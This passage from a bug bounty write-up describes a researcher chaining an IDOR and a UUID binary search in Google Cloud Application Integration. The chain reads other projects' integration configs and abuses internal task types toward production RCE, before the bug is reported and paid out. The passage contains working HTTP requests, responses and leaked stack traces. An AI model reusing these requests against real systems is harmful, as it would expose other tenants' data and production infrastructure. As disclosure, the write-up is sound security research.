Parent:    projects/273897706296/locations/us-central1/integrations/x/versions/-

Verified: target found. Starting binary search...

  [ 4/32] fb1d0000-0000-0000-0000-000000000000  (16 reqs)
  [ 8/32] fb1dc5f3-0000-0000-0000-000000000000  (32 reqs)
  [12/32] fb1dc5f3-0380-0000-0000-000000000000  (48 reqs)
  [16/32] fb1dc5f3-0380-491c-0000-000000000000  (64 reqs)
  [20/32] fb1dc5f3-0380-491c-af90-000000000000  (80 reqs)
  [24/32] fb1dc5f3-0380-491c-af90-5a1400000000  (96 reqs)
  [28/32] fb1dc5f3-0380-491c-af90-5a141aa00000  (112 reqs)
  [32/32] fb1dc5f3-0380-491c-af90-5a141aa02f56  (128 reqs)

workflow_id: fb1dc5f3-0380-491c-af90-5a141aa02f56
Total requests: 128
I now had the victim's actual integration version UUID. Chaining this with the
GetIntegrationVersion
IDOR:
GET
/v1/projects/<your-project>/locations/us-central1/integrations/x/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56
HTTP/2
Host
:
integrations.googleapis.com
Authorization
:
Bearer <redacted>
It returned the full integration belonging to a different project, including every trigger config, task config, parameter binding, and creator email:
{
"name"
:
"projects/<your-project>/locations/us-central1/integrations/TestCasePOC5/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56"
,
"state"
:
"DRAFT"
,
"triggerConfigs"
:
[
{
"label"
:
"API Trigger"
,
"triggerType"
:
"API"
,
"triggerId"
:
"api_trigger/TestCasePOC5_API_1"
}
]
,
"taskConfigs"
:
[
{
"task"
:
"GenericRestV2Task"
,
"displayName"
:
"Call REST Endpoint"
,
"parameters"
:
{
"url"
:
{
"key"
:
"url"
,
"value"
:
{
"stringValue"
:
"$url$"
}
}
,
"httpMethod"
:
{
"key"
:
"httpMethod"
,
"value"
:
{
"stringValue"
:
"POST"
}
}
,
"authConfigName"
:
{
"key"
:
"authConfigName"
,
"value"
:
{
"stringValue"
:
"authprofiletest"
}
}
}
}
]
,
...
"integrationParameters"
:
[
{
"key"
:
"url"
,
"dataType"
:
"STRING_VALUE"
,
"defaultValue"
:
{
"stringValue"
:
"https://example.com"
}
}
]
,
"lastModifierEmail"
:
"gvrptest4@gmail.com"
,
"createTime"
:
"2026-03-22T11:10:30.087Z"
}
If you remember from the original test cases dump, a fair number of those
creatorEmail
fields ended in
@google.com
. So there are plenty of internal Google teams running their own integrations on this platform. My obvious next thought was what if some of these Googler integrations already have
GenericStubbyTypedTaskV2
(or other internal-only tasks like
PythonTask
,
CreateBuganizerIssueTask
, etc.) configured? Any one of those would extend this cross-tenant chain into something significantly worse.
I couldn't actually check though. Doing so would mean iterating over real customer data which would break the Google VRP rules, so I bundled up everything I had and sent the report off to Cloud VRP.
#
Configuring internal task types
This made me think though, what exactly was stopping me from creating my own integration with an internal task type?
If I tried to create an internal task:
POST
/v1/projects/273897706296/locations/us-central1/integrations/ExampleTest1234/versions
HTTP/2
Host
:
integrations.googleapis.com
Authorization
:
Bearer <redacted>
Content-Length
:
1033
{
"taskConfigsInternal"
: [
    {
"taskNumber"
:
"1"
,
"taskName"
:
"PythonTask"
,
      ...
"taskEntity"
: {
"uiConfig"
: {
"taskUiModuleConfigs"
: [
            {
"moduleId"
:
"RPC_TYPED"
}
          ]
        }
      },
"taskType"
:
"ASIS_TEMPLATE"
,
"parameters"
: {
"TEST"
: {
"key"
:
"test"
,
"value"
: {
"stringValue"
:
"test"
}
        }
      }
    }
  ],
  ...
}
It would actually work:
HTTP/2
200
OK
Content-Type
:
application/json; charset=UTF-8
{
"name"
:
"projects/273897706296/locations/us-central1/integrations/ExampleTest1234/versions/304adc1b-6d09-4b2d-a070-db48b821879a"
,
"origin"
:
"UI"
,
"snapshotNumber"
:
"1"
,
"updateTime"
:
"2026-05-01T07:30:07.182512Z"
,
"lockHolder"
:
"gvrptest4
@gmail
.com"
,
"createTime"
:
"2026-05-01T07:30:07.182512Z"
,
"lastModifierEmail"
:
"gvrptest4
@gmail
.com"
,
"state"
:
"DRAFT"
,
  ...
}
But when I tried to actually execute the workflow, it would just time out with the following error:
Execution timeout, cancelled graph execution. The default timeout is 2min for sync execution and 10min for async execution. If you are using sync execution, please try async execution such as the Schedule API or Cloud Scheduler trigger. If you are already using async execution, please try to break down your integration into smaller pieces and chain them in the async way. Note any variable contains large data will also failed to upload to GCS. error/code: 'common_error_code: SYNC_EVENTBUS_EXECUTION_TIMEOUT''
However, I noticed something peculiar. When I configured the
PythonTask
(one of the internal tasks), created a test case and executed the test case, instead of timing out, I got this suspicious error on the frontend:
{
"1"
:
9
,
"2"
:
"java.io.IOException: No space left on device"
}
That's a real exception from the execution backend, not a timeout. Whatever code path the test case feature was running on, it was happily reaching deep enough to fail on actual disk I/O. Trying the same trick with
GenericStubbyTypedTaskV2
got me a less informative but equally suspicious response:
Failed to execute test case. Error: Unknown Error.
I checked the workflow execution logs, and that's when the actual error showed up:
{
"message"
:
"com.google.security.authentication.common.CredentialsUnsupportedException: UberMint verification is disabled. You can enable it in AuthenticationMethods; RpcSecurityPolicy http://rpcsp/p/4aPF9XD3vQ_2KYxu2J59zxrLEzDa2CDMRzIYnrADC4w "
,
"code"
:
500
}
This is extremely suspicious. I was definitely onto something. By hitting:
GET /v1/projects/<project>/locations/us-west1/integrations/ExampleTest1234:1/executions/id:download
Host
:
integrations.googleapis.com
It was possible to pull the entire stack trace:
com.google.enterprise.crm.exceptions.IpCanonicalCodeException: com.google.enterprise.crm.eventbus.testcase.task.mock.MockExecutionFailureException: com.google.net.rpc3.client.RpcClientException: <eye3 title='/EventbusStubbyCallerService.ExecuteStubbyCall, UNAUTHENTICATED'/> APPLICATION_ERROR;enterprise.crm.eventbus.stubby/EventbusStubbyCallerService.ExecuteStubbyCall;com.google.security.authentication.common.CredentialsUnsupportedException: UberMint verification is disabled. You can enable it in AuthenticationMethods; RpcSecurityPolicy http://rpcsp/p/4aPF9XD3vQ_2KYxu2J59zxrLEzDa2CDMRzIYnrADC4w ;AppErrorCode=16;StartTimeMs=1774319566778;unknown;ResFormat=uncompressed;ServerTimeSec=0.00194812;LogBytes=256;FailFast;EffSecLevel=none;ReqFormat=uncompressed;ReqID=bea3d76b582d8a4;GlobalID=0;Server=[2002:a05:6670:4003:b0:ced:80ad:4c54]:4001 Code: FAILED_PRECONDITION
	at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.serialize(EventParametersUtil.java:744)
	at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.serialize(EventParametersUtil.java:725)
	at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.toParameterValueType(EventParametersUtil.java:654)
	at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.lambda$addEventParametersToEventMessage$0(EventParametersUtil.java:475)
	at /java.base@25.0.1/java.util.stream.ReferencePipeline$3$1.accept(Unknown Source)
  ...
This made it clear that our variables were being plugged straight into an
ExecuteStubbyCallRequest
on the backend. Based on the stack traces from playing around with parameter values, I'd guess the backend code looks roughly like:
GenericStubbyTypedTaskV2.buildRequest():
    line
219
: setServerAddress(serverSpec)  → ExecuteStubbyCallRequest.java:
1123
line
220
: setServiceName(serviceName)   → ExecuteStubbyCallRequest.java:
1219
line
221
: setMethodName(serviceMethod)  → ExecuteStubbyCallRequest.java:
1313
...
So maybe there was some parameter I had to supply to get this working? The problem was the stack traces only helped me leak the three known parameters,
serverSpec
,
serviceName
, and
serviceMethod
but I wasn't able to find more from this method. Also, Google treats these RCE escalations as security incidents, so before going any further I asked Google's security team for the green light. They got back to me quickly and confirmed that this was exploitable and that I should stop further testing.
The report was quickly escalated to
P0/S0
and got a 🎉
Nice catch!
. Almost a month later, the report was awarded
$75,000
under "Compromise of Google Cloud Production Environment", my highest single bounty to-date.
VIDEO
From what I'd gathered from speaking to some Googlers, there are roughly three tiers for base RCE payouts under the
Cloud VRP table
:
$50k
: Relatively unprivileged production user access
$75k
: Privileged production user access
$100k
: Admin in Google Cloud
Where any given RCE actually lands on this scale depends entirely on how much of the production environment the compromised prod identity can reach directly. Obviously, given the vast attack surface accessible from production access, it's very likely possible to escalate privileges from any sort of initial access.
Google was oddly vague about the exact reasoning here, but it seemed that the internal team's own investigation of this chain surfaced significantly more impact in prod than even what I had shown, which is what landed it at the $75k tier.
#
Timeline (2nd RCE)
2026-03-21 - Initial report sent to Google
2026-03-23 - Google triaged report as P1/S1
2026-03-23 - Informed Google's security team about the RCE escalation
2026-03-23 - 🎉
Nice catch!
, report updated to P0/S0
2026-04-28 -
Panel awards $75,000
. Rationale for this decision: Vulnerability category is "Compromise of Google Cloud Production Environment". Vulnerabilities without any interaction or relationship between attacker and victim. Default Google Cloud products.
2026-05-06 - Informed Google that GetIntegrationVersion RPC was still vulnerable
2026-05-08 -
Panel awards additional $13,337
. Rationale for this decision: Vulnerability category is "Single-Service Privilege Escalation - WRITE". Vulnerabilities without any interaction or relationship between attacker and victim. Default Google Cloud products.
